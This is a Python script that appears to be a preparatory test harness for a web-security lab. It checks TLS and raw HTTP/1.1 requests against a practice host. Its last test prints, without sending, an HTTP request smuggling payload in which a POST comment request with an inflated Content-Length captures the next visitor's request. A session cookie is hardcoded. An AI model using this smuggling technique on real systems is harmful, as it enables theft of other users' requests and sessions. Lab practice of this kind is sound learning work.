#!/usr/bin/env python3
"""Test del transport layer: TLS + raw HTTP/1.1 contra el lab.

Sirve como sanity check antes de iterar sobre la lógica del smuggle.
"""
import ssl
import socket
import sys

LAB_HOST = "0a59003e03b985ed8007530a00c60024.web-security-academy.net"
SESSION  = "gBNS3CXZBSDnlbVzu85nUEyPMFz4nmi0"

def send_raw(payload, read_max=4096, timeout=5):
    """Manda bytes crudos por TLS, devuelve la response cruda."""
    ctx = ssl.create_default_context()
    with socket.create_connection((LAB_HOST, 443), timeout=10) as s:
        with ctx.wrap_socket(s, server_hostname=LAB_HOST) as ss:
            ss.sendall(payload)
            ss.settimeout(timeout)
            data = b""
            try:
                while len(data) < read_max:
                    chunk = ss.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass
            return data

def test_1_tls():
    """TLS handshake al host."""
    print("[1] TLS handshake...", end=" ")
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((LAB_HOST, 443), timeout=10) as s:
            with ctx.wrap_socket(s, server_hostname=LAB_HOST) as ss:
                cipher = ss.cipher()
                print(f"OK ({cipher[0]}, {cipher[1]})")
                return True
    except Exception as e:
        print(f"FAIL: {e}")
        return False

def test_2_simple_get():
    """GET / por raw HTTP/1.1 debe dar 200."""
    print("[2] GET / via raw HTTP/1.1...", end=" ")
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {LAB_HOST}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    try:
        resp = send_raw(payload)
        status = resp.split(b"\r\n", 1)[0].decode()
        print(f"OK ({status}, {len(resp)} bytes)")
        if not status.startswith("HTTP/1.1 200"):
            print(f"    esperaba 200, vino: {status}")
            return False
        return True
    except Exception as e:
        print(f"FAIL: {e}")
        return False

def test_3_get_with_session():
    """GET /my-account con session debe dar 200 (no 302 a /login)."""
    print("[3] GET /my-account con session...", end=" ")
    payload = (
        f"GET /my-account HTTP/1.1\r\n"
        f"Host: {LAB_HOST}\r\n"
        f"Cookie: session={SESSION}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    try:
        resp = send_raw(payload)
        status = resp.split(b"\r\n", 1)[0].decode()
        print(f"OK ({status})")
        if status.startswith("HTTP/1.1 302"):
            print(f"    302 = sesion invalida o expirada. Refresca SESSION.")
            return False
        return True
    except Exception as e:
        print(f"FAIL: {e}")
        return False

def test_4_post_comment_legit():
    """POST /post/comment confirma que el endpoint procesa POST con body.

    Va a dar 400 (CSRF DUMMY invalido) pero confirma que el path se alcanza.
    """
    print("[4] POST /post/comment legitimo (CSRF DUMMY -> 400 esperado)...", end=" ")
    body = "csrf=DUMMY&postId=7&name=Test&email=t%40t.t&website=&comment=ping"
    payload = (
        f"POST /post/comment HTTP/1.1\r\n"
        f"Host: {LAB_HOST}\r\n"
        f"Cookie: session={SESSION}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    ).encode()
    try:
        resp = send_raw(payload)
        status = resp.split(b"\r\n", 1)[0].decode()
        print(f"OK ({status})")
        return True
    except Exception as e:
        print(f"FAIL: {e}")
        return False

def test_5_smuggle_dry_run():
    """Imprime el payload del smuggle SIN mandarlo, para verificar bytecounts."""
    print("[5] Smuggle payload dry-run...")
    CL_INNER = 700
    CSRF = "REPLACE-ME"
    smuggled_body = f"csrf={CSRF}&postId=7&name=Name+1&email=a%40b.c&website=&comment="
    smuggled = (
        f"POST /post/comment HTTP/1.1\r\n"
        f"Host: {LAB_HOST}\r\n"
        f"Cookie: session={SESSION}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {CL_INNER}\r\n"
        f"\r\n"
        f"{smuggled_body}"
    )
    outer_body = f"0\r\n\r\n{smuggled}"
    print(f"    outer body length: {len(outer_body)} bytes (este es el outer CL)")
    print(f"    smuggled body provisto: {len(smuggled_body)} bytes")
    print(f"    smuggled CL declarado: {CL_INNER}")
    print(f"    bytes a absorber del proximo request: {CL_INNER - len(smuggled_body)}")
    print(f"\n    --- payload bytes (primeros 300) ---")
    print(repr(outer_body[:300]))

def main():
    print(f"Target: https://{LAB_HOST}\n")
    results = [
        test_1_tls(),
        test_2_simple_get(),
        test_3_get_with_session(),
        test_4_post_comment_legit(),
    ]
    test_5_smuggle_dry_run()
    print(f"\n{'='*40}")
    passed = sum(results)
    print(f"Tests: {passed}/{len(results)} pasados")
    sys.exit(0 if passed == len(results) else 1)

if __name__ == "__main__":
    main()
